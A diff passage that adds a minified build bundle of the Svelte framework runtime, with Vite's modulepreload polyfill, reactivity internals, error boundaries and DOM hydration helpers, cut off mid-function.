@@ -1,0 +1,6648 @@
+(function(){let e=document.createElement(`link`).relList;if(e&&e.supports&&e.supports(`modulepreload`))return;for(let e of document.querySelectorAll(`link[rel="modulepreload"]`))n(e);new MutationObserver(e=>{for(let t of e)if(t.type===`childList`)for(let e of t.addedNodes)e.tagName===`LINK`&&e.rel===`modulepreload`&&n(e)}).observe(document,{childList:!0,subtree:!0});function t(e){let t={};return e.integrity&&(t.integrity=e.integrity),e.referrerPolicy&&(t.referrerPolicy=e.referrerPolicy),e.crossOrigin===`use-credentials`?t.credentials=`include`:e.crossOrigin===`anonymous`?t.credentials=`omit`:t.credentials=`same-origin`,t}function n(e){if(e.ep)return;e.ep=!0;let n=t(e);fetch(e.href,n)}})();var e=Array.isArray,t=Array.prototype.indexOf,n=Array.prototype.includes,r=Array.from,i=Object.defineProperty,a=Object.getOwnPropertyDescriptor,o=Object.getOwnPropertyDescriptors,s=Object.prototype,c=Array.prototype,l=Object.getPrototypeOf,u=Object.isExtensible,d=()=>{};function f(e){return e()}function p(e){for(var t=0;t<e.length;t++)e[t]()}function m(){var e,t;return{promise:new Promise((n,r)=>{e=n,t=r}),resolve:e,reject:t}}function h(e,t){if(Array.isArray(e))return e;if(t===void 0||!(Symbol.iterator in e))return Array.from(e);let n=[];for(let r of e)if(n.push(r),n.length===t)break;return n}var g=1024,_=2048,v=4096,y=8192,b=16384,x=32768,S=1<<25,C=65536,w=1<<19,ee=1<<20,te=1<<25,T=65536,E=1<<21,ne=1<<22,re=1<<23,D=Symbol(`$state`),O=Symbol(`legacy props`),ie=Symbol(``),ae=Symbol(`attributes`),oe=Symbol(`class`),se=Symbol(`style`),ce=Symbol(`text`),le=Symbol(`form reset`),ue=new class extends Error{name=`StaleReactionError`;message="The reaction that called `getAbortSignal()` was re-run or destroyed"},de=!!globalThis.document?.contentType&&globalThis.document.contentType.includes(`xml`);function fe(e){throw Error(`https://svelte.dev/e/lifecycle_outside_component`)}function pe(){throw Error(`https://svelte.dev/e/async_derived_orphan`)}function me(e,t,n){throw Error(`https://svelte.dev/e/each_key_duplicate`)}function he(e){throw Error(`https://svelte.dev/e/effect_in_teardown`)}function ge(){throw Error(`https://svelte.dev/e/effect_in_unowned_derived`)}function _e(e){throw Error(`https://svelte.dev/e/effect_orphan`)}function ve(){throw Error(`https://svelte.dev/e/effect_update_depth_exceeded`)}function ye(e){throw Error(`https://svelte.dev/e/props_invalid_value`)}function be(){throw Error(`https://svelte.dev/e/state_descriptors_fixed`)}function xe(){throw Error(`https://svelte.dev/e/state_prototype_fixed`)}function Se(){throw Error(`https://svelte.dev/e/state_unsafe_mutation`)}function Ce(){throw Error(`https://svelte.dev/e/svelte_boundary_reset_onerror`)}var we={},Te=Symbol(`uninitialized`),Ee=`http://www.w3.org/1999/xhtml`,De=`http://www.w3.org/2000/svg`,Oe=`http://www.w3.org/1998/Math/MathML`;function ke(){console.warn(`https://svelte.dev/e/derived_inert`)}function Ae(e){console.warn(`https://svelte.dev/e/hydration_mismatch`)}function je(){console.warn(`https://svelte.dev/e/select_multiple_invalid_value`)}function Me(){console.warn(`https://svelte.dev/e/svelte_boundary_reset_noop`)}var k=!1;function Ne(e){k=e}var A;function Pe(e){if(e===null)throw Ae(),we;return A=e}function Fe(){return Pe(Tn(A))}function j(e){if(k){if(Tn(A)!==null)throw Ae(),we;A=e}}function Ie(e=1){if(k){for(var t=e,n=A;t--;)n=Tn(n);A=n}}function Le(e=!0){for(var t=0,n=A;;){if(n.nodeType===8){var r=n.data;if(r===`]`){if(t===0)return n;--t}else (r===`[`||r===`[!`||r[0]===`[`&&!isNaN(Number(r.slice(1))))&&(t+=1)}var i=Tn(n);e&&n.remove(),n=i}}function Re(e){if(!e||e.nodeType!==8)throw Ae(),we;return e.data}function ze(e){return e===this.v}function Be(e,t){return e==e?e!==t||typeof e==`object`&&!!e||typeof e==`function`:t==t}function Ve(e){return!Be(e,this.v)}var He=!1,Ue=!1;function We(){Ue=!0}var Ge=null;function Ke(e){Ge=e}function qe(e,t=!1,n){Ge={p:Ge,i:!1,c:null,e:null,s:e,x:null,r:B,l:Ue&&!t?{s:null,u:null,$:[]}:null}}function Je(e){var t=Ge,n=t.e;if(n!==null){t.e=null;for(var r of n)Hn(r)}return e!==void 0&&(t.x=e),t.i=!0,Ge=t.p,e??{}}function Ye(){return!Ue||Ge!==null&&Ge.l===null}var Xe=[];function Ze(){var e=Xe;Xe=[],p(e)}function Qe(e){if(Xe.length===0&&!Tt){var t=Xe;queueMicrotask(()=>{t===Xe&&Ze()})}Xe.push(e)}function $e(){for(;Xe.length>0;)Ze()}function et(e){var t=B;if(t===null)return dr.f|=re,e;if(!(t.f&32768)&&!(t.f&4))throw e;tt(e,t)}function tt(e,t){for(;t!==null;){if(t.f&128){if(!(t.f&32768))throw e;try{t.b.error(e);return}catch(t){e=t}}t=t.parent}throw e}var nt=~(_|v|g);function rt(e,t){e.f=e.f&nt|t}function it(e){e.f&512||e.deps===null?rt(e,g):rt(e,v)}function at(e){if(e!==null)for(let t of e)!(t.f&2)||!(t.f&65536)||(t.f^=T,at(t.deps))}function ot(e,t,n){e.f&2048?t.add(e):e.f&4096&&n.add(e),at(e.deps),rt(e,g)}function st(e,t,n){if(e==null)return t(void 0),n&&n(void 0),d;let r=Fr(()=>e.subscribe(t,n));return r.unsubscribe?()=>r.unsubscribe():r}var ct=[];function lt(e,t){return{subscribe:ut(e,t).subscribe}}function ut(e,t=d){let n=null,r=new Set;function i(t){if(Be(e,t)&&(e=t,n)){let t=!ct.length;for(let t of r)t[1](),ct.push(t,e);if(t){for(let e=0;e<ct.length;e+=2)ct[e][0](ct[e+1]);ct.length=0}}}function a(t){i(t(e))}function o(o,s=d){let c=[o,s];return r.add(c),r.size===1&&(n=t(i,a)||d),o(e),()=>{r.delete(c),r.size===0&&n&&(n(),n=null)}}return{set:i,update:a,subscribe:o}}function dt(e,t,n){let r=!Array.isArray(e),i=r?[e]:e;if(!i.every(Boolean))throw Error(`derived() expects stores as input, got a falsy value`);let a=t.length<2;return lt(n,(e,n)=>{let o=!1,s=[],c=0,l=d,u=()=>{if(c)return;l();let i=t(r?s[0]:s,e,n);a?e(i):l=typeof i==`function`?i:d},f=i.map((e,t)=>st(e,e=>{s[t]=e,c&=~(1<<t),o&&u()},()=>{c|=1<<t}));return o=!0,u(),function(){p(f),l(),o=!1}})}function ft(e){let t;return st(e,e=>t=e)(),t}var pt=!1,mt=!1,ht=Symbol(`unmounted`);function M(e,t,n){let r=n[t]??={store:null,source:un(void 0),unsubscribe:d};if(r.store!==e&&!(ht in n))if(r.unsubscribe(),r.store=e??null,e==null)r.source.v=void 0,r.unsubscribe=d;else{var i=!0;r.unsubscribe=st(e,e=>{i?r.source.v=e:F(r.source,e)}),i=!1}return e&&ht in n?ft(e):V(r.source)}function gt(){let e={};function t(){Bn(()=>{for(var t in e)e[t].unsubscribe();i(e,ht,{enumerable:!1,value:!0})})}return[e,t]}function _t(e,t){pt=!0;try{e.set(t)}finally{pt=!1}}function vt(e,t,n){return _t(e,n),t}function yt(e){var t=mt;try{return mt=!1,[e(),mt]}finally{mt=t}}var bt=null,xt=null,N=null,St=null,Ct=null,wt=null,Tt=!1,Et=!1,Dt=null,Ot=null,kt=0,At=1,jt=class e{id=At++;#e=!1;linked=!0;#t=null;#n=null;async_deriveds=new Map;current=new Map;previous=new Map;unblocked=new Set;#r=new Set;#i=new Set;#a=new Set;#o=0;#s=new Map;#c=null;#l=[];#u=[];#d=new Set;#f=new Set;#p=new Map;#m=new Set;is_fork=!1;#h=!1;#g(){if(this.is_fork)return!0;for(let n of this.#s.keys()){for(var e=n,t=!1;e.parent!==null;){if(this.#p.has(e)){t=!0;break}e=e.parent}if(!t)return!0}return!1}skip_effect(e){this.#p.has(e)||this.#p.set(e,{d:[],m:[]}),this.#m.delete(e)}unskip_effect(e,t=e=>this.schedule(e)){var n=this.#p.get(e);if(n){this.#p.delete(e);for(var r of n.d)rt(r,_),t(r);for(r of n.m)rt(r,v),t(r)}this.#m.add(e)}#_(){if(this.#e=!0,kt++>1e3&&(this.#w(),Nt()),!this.#g()){for(let e of this.#d)this.#f.delete(e),rt(e,_),this.schedule(e);for(let e of this.#f)rt(e,v),this.schedule(e)}let t=this.#l;this.#l=[],this.apply();var n=Dt=[],r=[],i=Ot=[];for(let e of t)try{this.#v(e,n,r)}catch(t){throw Bt(e),t}if(N=null,i.length>0){var a=e.ensure();for(let e of i)a.schedule(e)}if(Dt=null,Ot=null,this.#g()){this.#x(r),this.#x(n);for(let[e,t]of this.#p)zt(e,t);i.length>0&&N.#_();return}let o=this.#y();if(o){o.#b(this);return}this.#d.clear(),this.#f.clear();for(let e of this.#r)e(this);this.#r.clear(),St=this,Ft(r),Ft(n),St=null,this.#c?.resolve();var s=N;if(this.linked&&this.#o===0&&this.#w(),He&&!this.linked&&(this.#S(),N=s),this.#l.length>0){s===null&&(s=this,this.#C());let e=s;e.#l.push(...this.#l.filter(t=>!e.#l.includes(t)))}s!==null&&s.#_()}#v(e,t,n){e.f^=g;for(var r=e.first;r!==null;){var i=r.f,a=(i&96)!=0;if(!(a&&i&1024||i&8192||this.#p.has(r))&&r.fn!==null){a?r.f^=g:i&4?t.push(r):He&&i&16777224?n.push(r):Er(r)&&(i&16&&this.#f.add(r),jr(r));var o=r.first;if(o!==null){r=o;continue}}for(;r!==null;){var s=r.next;if(s!==null){r=s;break}r=r.parent}}}#y(){for(var e=this.#t;e!==null;){if(!e.is_fork){for(let[t,[,n]]of this.current)if(e.current.has(t)&&!n)return e}e=e.#t}return null}#b(e){for(let[t,n]of e.current)!this.previous.has(t)&&e.previous.has(t)&&this.previous.set(t,e.previous.get(t)),this.current.set(t,n);for(let[t,n]of e.async_deriveds){let e=this.async_deriveds.get(t);e&&n.promise.then(e.resolve)}let t=e=>{var n=e.reactions;if(n!==null)for(let e of n){var r=e.f;if(r&2)t(e);else{var i=e;r&4194320&&!this.async_deriveds.has(i)&&(this.#f.delete(i),rt(i,_),this.schedule(i))}}};for(let e of this.current.keys())t(e);this.oncommit(()=>e.discard()),e.#w(),N=this,this.#_()}#x(e){for(var t=0;t<e.length;t+=1)ot(e[t],this.#d,this.#f)}capture(e,t,n=!1){e.v!==Te&&!this.previous.has(e)&&this.previous.set(e,e.v),e.f&8388608||(this.current.set(e,[t,n]),Ct?.set(e,t)),this.is_fork||(e.v=t)}activate(){N=this}deactivate(){N=null,Ct=null}flush(){try{Et=!0,N=this,this.#_()}finally{kt=0,wt=null,Dt=null,Ot=null,Et=!1,N=null,Ct=null,sn.clear()}}discard(){for(let e of this.#i)e(this);this.#i.clear(),this.#a.clear(),this.#w()}register_created_effect(e){this.#u.push(e)}#S(){this.#w();for(let l=bt;l!==null;l=l.#n){var e=l.id<this.id,t=[];for(let[r,[i,a]]of this.current){if(l.current.has(r)){var n=l.current.get(r)[0];if(e&&i!==n)l.current.set(r,[i,a]);else continue}t.push(r)}if(e)for(let[e,t]of this.async_deriveds){let n=l.async_deriveds.get(e);n&&t.promise.then(n.resolve)}if(l.#e){var r=[...l.current.keys()].filter(e=>!this.current.has(e));if(r.length===0)e&&l.discard();else if(t.length>0){if(e)for(let e of this.#m)l.unskip_effect(e,e=>{e.f&4194320?l.schedule(e):l.#x([e])});l.activate();var i=new Set,a=new Map;for(var o of t)It(o,r,i,a);a=new Map;var s=[...l.current.keys()].filter(e=>this.current.has(e)?this.current.get(e)[0]!==e.v:!0);if(s.length>0)for(let e of this.#u)!(e.f&155648)&&Lt(e,s,a)&&(e.f&4194320?(rt(e,_),l.schedule(e)):l.#d.add(e));if(l.#l.length>0&&!l.#h){l.apply();for(var c of l.#l)l.#v(c,[],[]);l.#l=[]}l.deactivate()}}}}increment(e,t){if(this.#o+=1,e){let e=this.#s.get(t)??0;this.#s.set(t,e+1)}}decrement(e,t){if(--this.#o,e){let e=this.#s.get(t)??0;e===1?this.#s.delete(t):this.#s.set(t,e-1)}this.#h||(this.#h=!0,Qe(()=>{this.#h=!1,this.linked&&this.flush()}))}transfer_effects(e,t){for(let t of e)this.#d.add(t);for(let e of t)this.#f.add(e);e.clear(),t.clear()}oncommit(e){this.#r.add(e)}ondiscard(e){this.#i.add(e)}on_fork_commit(e){this.#a.add(e)}run_fork_commit_callbacks(){for(let e of this.#a)e(this);this.#a.clear()}settled(){return(this.#c??=m()).promise}static ensure(){if(N===null){let t=N=new e;t.#C(),!Et&&!Tt&&Qe(()=>{t.#e||t.flush()})}return N}apply(){if(!He||!this.is_fork&&this.#t===null&&this.#n===null){Ct=null;return}Ct=new Map;for(let[e,[t]]of this.current)Ct.set(e,t);for(let t=bt;t!==null;t=t.#n)if(!(t===this||t.is_fork)){var e=!1;if(t.id<this.id){for(let[n,[,r]]of t.current)if(!r&&this.current.has(n)){e=!0;break}}if(!e)for(let[e,n]of t.previous)Ct.has(e)||Ct.set(e,n)}}schedule(e){if(wt=e,e.b?.is_pending&&e.f&16777228&&!(e.f&32768)){e.b.defer_effect(e);return}for(var t=e;t.parent!==null;){t=t.parent;var n=t.f;if(Dt!==null&&t===B&&(He||(dr===null||!(dr.f&2))&&!pt))return;if(n&96){if(!(n&1024))return;t.f^=g}}this.#l.push(t)}#C(){xt===null?bt=xt=this:(xt.#n=this,this.#t=xt),xt=this}#w(){var e=this.#t,t=this.#n;e===null?bt=t:e.#n=t,t===null?xt=e:t.#t=e,this.linked=!1}};function Mt(e){var t=Tt;Tt=!0;try{var n;for(e&&(N!==null&&!N.is_fork&&N.flush(),n=e());;){if($e(),N===null)return n;N.flush()}}finally{Tt=t}}function Nt(){try{ve()}catch(e){tt(e,wt)}}var Pt=null;function Ft(e){var t=e.length;if(t!==0){for(var n=0;n<t;){var r=e[n++];if(!(r.f&24576)&&Er(r)&&(Pt=new Set,jr(r),r.deps===null&&r.first===null&&r.nodes===null&&r.teardown===null&&r.ac===null&&tr(r),Pt?.size>0)){sn.clear();for(let e of Pt){if(e.f&24576)continue;let t=[e],n=e.parent;for(;n!==null;)Pt.has(n)&&(Pt.delete(n),t.push(n)),n=n.parent;for(let e=t.length-1;e>=0;e--){let n=t[e];n.f&24576||jr(n)}}Pt.clear()}}Pt=null}}function It(e,t,n,r){if(!n.has(e)&&(n.add(e),e.reactions!==null))for(let i of e.reactions){let e=i.f;e&2?It(i,t,n,r):e&4194320&&!(e&2048)&&Lt(i,t,r)&&(rt(i,_),Rt(i))}}function Lt(e,t,r){let i=r.get(e);if(i!==void 0)return i;if(e.deps!==null)for(let i of e.deps){if(n.call(t,i))return!0;if(i.f&2&&Lt(i,t,r))return r.set(i,!0),!0}return r.set(e,!1),!1}function Rt(e){N.schedule(e)}function zt(e,t){if(!(e.f&32&&e.f&1024)){e.f&2048?t.d.push(e):e.f&4096&&t.m.push(e),rt(e,g);for(var n=e.first;n!==null;)zt(n,t),n=n.next}}function Bt(e){rt(e,g);for(var t=e.first;t!==null;)Bt(t),t=t.next}function Vt(e){let t=0,n=ln(0),r;return()=>{zn()&&(V(n),qn(()=>(t===0&&(r=Fr(()=>e(()=>pn(n)))),t+=1,()=>{Qe(()=>{--t,t===0&&(r?.(),r=void 0,pn(n))})})))}}var Ht=C|w;function Ut(e,t,n,r){new Wt(e,t,n,r)}var Wt=class{parent;is_pending=!1;transform_error;#e;#t=k?A:null;#n;#r;#i;#a=null;#o=null;#s=null;#c=null;#l=0;#u=0;#d=!1;#f=new Set;#p=new Set;#m=null;#h=Vt(()=>(this.#m=ln(this.#l),()=>{this.#m=null}));constructor(e,t,n,r){this.#e=e,this.#n=t,this.#r=e=>{var t=B;t.b=this,t.f|=128,n(e)},this.parent=B.b,this.transform_error=r??this.parent?.transform_error??(e=>e),this.#i=Jn(()=>{if(k){let e=this.#t;Fe();let t=e.data===`[!`;if(e.data.startsWith(`[?`)){let t=JSON.parse(e.data.slice(2));this.#_(t)}else t?this.#v():this.#g()}else this.#y()},Ht),k&&(this.#e=A)}#g(){try{this.#a=Yn(()=>this.#r(this.#e))}catch(e){this.error(e)}}#_(e){let t=this.#n.failed;t&&(this.#s=Yn(()=>{t(this.#e,()=>e,()=>()=>{})}))}#v(){let e=this.#n.pending;e&&(this.is_pending=!0,this.#o=Yn(()=>e(this.#e)),Qe(()=>{var e=this.#c=document.createDocumentFragment(),t=Cn();e.append(t),this.#a=this.#x(()=>Yn(()=>this.#r(t))),this.#u===0&&(this.#e.before(e),this.#c=null,nr(this.#o,()=>{this.#o=null}),this.#b(N))}))}#y(){try{if(this.is_pending=this.has_pending_snippet(),this.#u=0,this.#l=0,this.#a=Yn(()=>{this.#r(this.#e)}),this.#u>0){var e=this.#c=document.createDocumentFragment();or(this.#a,e);let t=this.#n.pending;this.#o=Yn(()=>t(this.#e))}else this.#b(N)}catch(e){this.error(e)}}#b(e){this.is_pending=!1,e.transfer_effects(this.#f,this.#p)}defer_effect(e){ot(e,this.#f,this.#p)}is_rendered(){return!this.is_pending&&(!this.parent||this.parent.is_rendered())}has_pending_snippet(){return!!this.#n.pending}#x(e){var t=B,n=dr,r=Ge;mr(this.#i),pr(this.#i),Ke(this.#i.ctx);try{return jt.ensure(),e()}catch(e){return et(e),null}finally{mr(t),pr(n),Ke(r)}}#S(e,t){if(!this.has_pending_snippet()){this.parent&&this.parent.#S(e,t);return}this.#u+=e,this.#u===0&&(this.#b(t),this.#o&&nr(this.#o,()=>{this.#o=null}),this.#c&&=(this.#e.before(this.#c),null))}update_pending_count(e,t){this.#S(e,t),this.#l+=e,!(!this.#m||this.#d)&&(this.#d=!0,Qe(()=>{this.#d=!1,this.#m&&dn(this.#m,this.#l)}))}get_effect_pending(){return this.#h(),V(this.#m)}error(e){if(!this.#n.onerror&&!this.#n.failed)throw e;N?.is_fork?(this.#a&&N.skip_effect(this.#a),this.#o&&N.skip_effect(this.#o),this.#s&&N.skip_effect(this.#s),N.on_fork_commit(()=>{this.#C(e)})):this.#C(e)}#C(e){this.#a&&=($n(this.#a),null),this.#o&&=($n(this.#o),null),this.#s&&=($n(this.#s),null),k&&(Pe(this.#t),Ie(),Pe(Le()));var t=this.#n.onerror;let n=this.#n.failed;var r=!1,i=!1;let a=()=>{if(r){Me();return}r=!0,i&&Ce(),this.#s!==null&&nr(this.#s,()=>{this.#s=null}),this.#x(()=>{this.#y()})},o=e=>{try{i=!0,t?.(e,a),i=!1}catch(e){tt(e,this.#i&&this.#i.parent)}n&&(this.#s=this.#x(()=>{try{return Yn(()=>{var t=B;t.b=this,t.f|=128,n(this.#e,()=>e,()=>a)})}catch(e){return tt(e,this.#i.parent),null}}))};Qe(()=>{var t;try{t=this.transform_error(e)}catch(e){tt(e,this.#i&&this.#i.parent);return}typeof t==`object`&&t&&typeof t.then==`function`?t.then(o,e=>tt(e,this.#i&&this.#i.parent)):o(t)})}};function Gt(e,t,n,r){let i=Ye()?Yt:$t;var a=e.filter(e=>!e.settled);if(n.length===0&&a.length===0){r(t.map(i));return}var o=B,s=Kt(),c=a.length===1?a[0].promise:a.length>1?Promise.all(a.map(e=>e.promise)):null;function l(e){if(!(o.f&16384)){s();try{r(e)}catch(e){tt(e,o)}qt()}}var u=Jt();if(n.length===0){c.then(()=>l(t.map(i))).finally(u);return}function d(){Promise.all(n.map(e=>Zt(e))).then(e=>l([...t.map(i),...e])).catch(e=>tt(e,o)).finally(u)}c?c.then(()=>{s(),d(),qt()}):d()}function Kt(){var e=B,t=dr,n=Ge,r=N;return function(i=!0){mr(e),pr(t),Ke(n),i&&!(e.f&16384)&&(r?.activate(),r?.apply())}}function qt(e=!0){mr(null),pr(null),Ke(null),e&&N?.deactivate()}function Jt(){var e=B,t=e.b,n=N,r=t.is_rendered();return t.update_pending_count(1,n),n.increment(r,e),()=>{t.update_pending_count(-1,n),n.decrement(r,e)}}function Yt(e){var t=2|_;return B!==null&&(B.f|=w),{ctx:Ge,deps:null,effects:null,equals:ze,f:t,fn:e,reactions:null,rv:0,v:Te,wv:0,parent:B,ac:null}}var Xt=Symbol(`obsolete`);function Zt(e,t,n){let r=B;r===null&&pe();var i=void 0,a=ln(Te),o=!dr,s=new Set;return Kn(()=>{var t=B,n=m();i=n.promise;try{Promise.resolve(e()).then(n.resolve,e=>{e!==ue&&n.reject(e)}).finally(qt)}catch(e){n.reject(e),qt()}var c=N;if(o){if(t.f&32768)var l=Jt();if(r.b.is_rendered())c.async_deriveds.get(t)?.reject(Xt);else for(let e of s.values())e.reject(Xt);s.add(n),c.async_deriveds.set(t,n)}let u=(e,t=void 0)=>{l?.(),s.delete(n),t!==Xt&&(c.activate(),t?(a.f|=re,dn(a,t)):(a.f&8388608&&(a.f^=re),dn(a,e)),c.deactivate())};n.promise.then(u,e=>u(null,e||`unknown`))}),Bn(()=>{for(let e of s)e.reject(Xt)}),new Promise(e=>{function t(n){function r(){n===i?e(a):t(i)}n.then(r,r)}t(i)})}function Qt(e){let t=Yt(e);return He||gr(t),t}function $t(e){let t=Yt(e);return t.equals=Ve,t}function en(e){var t=e.effects;if(t!==null){e.effects=null;for(var n=0;n<t.length;n+=1)$n(t[n])}}function tn(e){var t,n=B,r=e.parent;if(!lr&&r!==null&&e.v!==Te&&r.f&24576)return ke(),e.v;mr(r);try{e.f&=~T,en(e),t=Or(e)}finally{mr(n)}return t}function nn(e){var t=tn(e);if(!e.equals(t)&&(e.wv=Tr(),(!N?.is_fork||e.deps===null)&&(N===null?e.v=t:(N.capture(e,t,!0),St?.capture(e,t,!0)),e.deps===null))){rt(e,g);return}lr||(Ct===null?it(e):(zn()||N?.is_fork)&&Ct.set(e,t))}function rn(e){if(e.effects!==null)for(let t of e.effects)(t.teardown||t.ac)&&(t.teardown?.(),t.ac?.abort(ue),t.fn!==null&&(t.teardown=d),t.ac=null,Ar(t,0),Zn(t))}function an(e){if(e.effects!==null)for(let t of e.effects)t.teardown&&t.fn!==null&&jr(t)}var on=new Set,sn=new Map,cn=!1;function ln(e,t){return{f:0,v:e,reactions:null,equals:ze,rv:0,wv:0}}function P(e,t){let n=ln(e,t);return gr(n),n}function un(e,t=!1,n=!0){let r=ln(e);return t||(r.equals=Ve),Ue&&n&&Ge!==null&&Ge.l!==null&&(Ge.l.s??=[]).push(r),r}function F(e,t,r=!1){return dr!==null&&(!fr||dr.f&131072)&&Ye()&&dr.f&4325394&&(hr===null||!n.call(hr,e))&&Se(),dn(e,r?hn(t):t,Ot)}function dn(e,t,n=null){if(!e.equals(t)){sn.set(e,lr?t:e.v);var r=jt.ensure();if(r.capture(e,t),e.f&2){let t=e;e.f&2048&&tn(t),Ct===null&&it(t)}e.wv=Tr(),mn(e,_,n),Ye()&&B!==null&&B.f&1024&&!(B.f&96)&&(yr===null?br([e]):yr.push(e)),!r.is_fork&&on.size>0&&!cn&&fn()}return t}function fn(){cn=!1;for(let e of on){e.f&1024&&rt(e,v);let t;try{t=Er(e)}catch{t=!0}t&&jr(e)}on.clear()}function pn(e){F(e,e.v+1)}function mn(e,t,n){var r=e.reactions;if(r!==null)for(var i=Ye(),a=r.length,o=0;o<a;o++){var s=r[o],c=s.f;if(!(!i&&s===B)){var l=(c&_)===0;if(l&&rt(s,t),c&131072)on.add(s);else if(c&2){var u=s;Ct?.delete(u),c&65536||(c&512&&(B===null||!(B.f&2097152))&&(s.f|=T),mn(u,v,n))}else if(l){var d=s;c&16&&Pt!==null&&Pt.add(d),n===null?Rt(d):n.push(d)}}}}function hn(t){if(typeof t!=`object`||!t||D in t)return t;let n=l(t);if(n!==s&&n!==c)return t;var r=new Map,i=e(t),o=P(0),u=null,d=Cr,f=e=>{if(Cr===d)return e();var t=dr,n=Cr;pr(null),wr(d);var r=e();return pr(t),wr(n),r};return i&&r.set(`length`,P(t.length,u)),new Proxy(t,{defineProperty(e,t,n){(!(`value`in n)||n.configurable===!1||n.enumerable===!1||n.writable===!1)&&be();var i=r.get(t);return i===void 0?f(()=>{var e=P(n.value,u);return r.set(t,e),e}):F(i,n.value,!0),!0},deleteProperty(e,t){var n=r.get(t);if(n===void 0){if(t in e){let e=f(()=>P(Te,u));r.set(t,e),pn(o)}}else F(n,Te),pn(o);return!0},get(e,n,i){if(n===D)return t;var o=r.get(n),s=n in e;if(o===void 0&&(!s||a(e,n)?.writable)&&(o=f(()=>P(hn(s?e[n]:Te),u)),r.set(n,o)),o!==void 0){var c=V(o);return c===Te?void 0:c}return Reflect.get(e,n,i)},getOwnPropertyDescriptor(e,t){var n=Reflect.getOwnPropertyDescriptor(e,t);if(n&&`value`in n){var i=r.get(t);i&&(n.value=V(i))}else if(n===void 0){var a=r.get(t),o=a?.v;if(a!==void 0&&o!==Te)return{enumerable:!0,configurable:!0,value:o,writable:!0}}return n},has(e,t){if(t===D)return!0;var n=r.get(t),i=n!==void 0&&n.v!==Te||Reflect.has(e,t);return(n!==void 0||B!==null&&(!i||a(e,t)?.writable))&&(n===void 0&&(n=f(()=>P(i?hn(e[t]):Te,u)),r.set(t,n)),V(n)===Te)?!1:i},set(e,t,n,s){var c=r.get(t),l=t in e;if(i&&t===`length`)for(var d=n;d<c.v;d+=1){var p=r.get(d+``);p===void 0?d in e&&(p=f(()=>P(Te,u)),r.set(d+``,p)):F(p,Te)}if(c===void 0)(!l||a(e,t)?.writable)&&(c=f(()=>P(void 0,u)),F(c,hn(n)),r.set(t,c));else{l=c.v!==Te;var m=f(()=>hn(n));F(c,m)}var h=Reflect.getOwnPropertyDescriptor(e,t);if(h?.set&&h.set.call(s,n),!l){if(i&&typeof t==`string`){var g=r.get(`length`),_=Number(t);Number.isInteger(_)&&_>=g.v&&F(g,_+1)}pn(o)}return!0},ownKeys(e){V(o);var t=Reflect.ownKeys(e).filter(e=>{var t=r.get(e);return t===void 0||t.v!==Te});for(var[n,i]of r)i.v!==Te&&!(n in e)&&t.push(n);return t},setPrototypeOf(){xe()}})}function gn(e){try{if(typeof e==`object`&&e&&D in e)return e[D]}catch{}return e}function _n(e,t){return Object.is(gn(e),gn(t))}new Set([`copyWithin`,`fill`,`pop`,`push`,`reverse`,`shift`,`sort`,`splice`,`unshift`]);var vn,yn,bn,xn;function Sn(){if(vn===void 0){vn=window,yn=/Firefox/.test(navigator.userAgent);var e=Element.prototype,t=Node.prototype,n=Text.prototype;bn=a(t,`firstChild`).get,xn=a(t,`nextSibling`).get,u(e)&&(e[oe]=void 0,e[ae]=null,e[se]=void 0,e.__e=void 0),u(n)&&(n[ce]=void 0)}}function Cn(e=``){return document.createTextNode(e)}function wn(e){return bn.call(e)}function Tn(e){return xn.call(e)}function I(e,t){if(!k)return wn(e);var n=wn(A);if(n===null)n=A.appendChild(Cn());else if(t&&n.nodeType!==3){var r=Cn();return n?.before(r),Pe(r),r}return t&&kn(n),Pe(n),n}function L(e,t=!1){if(!k){var n=wn(e);return n instanceof Comment&&n.data===``?Tn(n):n}if(t){if(A?.nodeType!==3){var r=Cn();return A?.before(r),Pe(r),r}kn(A)}return A}function R(e,t=1,n=!1){let r=k?A:e;for(var i;t--;)i=r,r=Tn(r);if(!k)return r;if(n){if(r?.nodeType!==3){var a=Cn();return r===null?i?.after(a):r.before(a),Pe(a),a}kn(r)}return Pe(r),r}function En(e){e.textContent=``}function Dn(){return!He||Pt!==null?!1:(B.f&x)!==0}function On(e,t,n){let r=n?{is:n}:void 0;return document.createElementNS(t??`http://www.w3.org/1999/xhtml`,e,r)}function kn(e){if(e.nodeValue.length<65536)return;let t=e.nextSibling;for(;t!==null&&t.nodeType===3;)t.remove(),e.nodeValue+=t.nodeValue,t=e.nextSibling}function An(e,t){if(t){let t=document.body;e.autofocus=!0,Qe(()=>{document.activeElement===t&&e.focus()})}}function jn(e){k&&wn(e)!==null&&En(e)}var Mn=!1;function Nn(){Mn||(Mn=!0,document.addEventListener(`reset`,e=>{Promise.resolve().then(()=>{if(!e.defaultPrevented)for(let t of e.target.elements)t[le]?.()})},{capture:!0}))}function Pn(e){var t=dr,n=B;pr(null),mr(null);try{return e()}finally{pr(t),mr(n)}}function Fn(e,t,n,r=n){e.addEventListener(t,()=>Pn(n));let i=e[le];i?e[le]=()=>{i(),r(!0)}:e[le]=()=>r(!0),Nn()}function In(e){B===null&&(dr===null&&_e(e),ge()),lr&&he(e)}function Ln(e,t){var n=t.last;n===null?t.last=t.first=e:(n.next=e,e.prev=n,t.last=e)}function Rn(e,t){var n=B;n!==null&&n.f&8192&&(e|=y);var r={ctx:Ge,deps:null,nodes:null,f:e|_|512,first:null,fn:t,last:null,next:null,parent:n,b:n&&n.b,prev:null,teardown:null,wv:0,ac:null};N?.register_created_effect(r);var i=r;if(e&4)Dt===null?jt.ensure().schedule(r):Dt.push(r);else if(t!==null){try{jr(r)}catch(e){throw $n(r),e}i.deps===null&&i.teardown===null&&i.nodes===null&&i.first===i.last&&!(i.f&524288)&&(i=i.first,e&16&&e&65536&&i!==null&&(i.f|=C))}if(i!==null&&(i.parent=n,n!==null&&Ln(i,n),dr!==null&&dr.f&2&&!(e&64))){var a=dr;(a.effects??=[]).push(i)}return r}function zn(){return dr!==null&&!fr}function Bn(e){let t=Rn(8,null);return rt(t,g),t.teardown=e,t}function Vn(e){In(`$effect`);var t=B.f;if(!dr&&t&32&&!(t&32768)){var n=Ge;(n.e??=[]).push(e)}else return Hn(e)}function Hn(e){return Rn(4|ee,e)}function Un(e){return In(`$effect.pre`),Rn(8|ee,e)}function Wn(e){jt.ensure();let t=Rn(64|w,e);return(e={})=>new Promise(n=>{e.outro?nr(t,()=>{$n(t),n(void 0)}):($n(t),n(void 0))})}function Gn(e){return Rn(4,e)}function Kn(e){return Rn(ne|w,e)}function qn(e,t=0){return Rn(8|t,e)}function z(e,t=[],n=[],r=[]){Gt(r,t,n,t=>{Rn(8,()=>e(...t.map(V)))})}function Jn(e,t=0){return Rn(16|t,e)}function 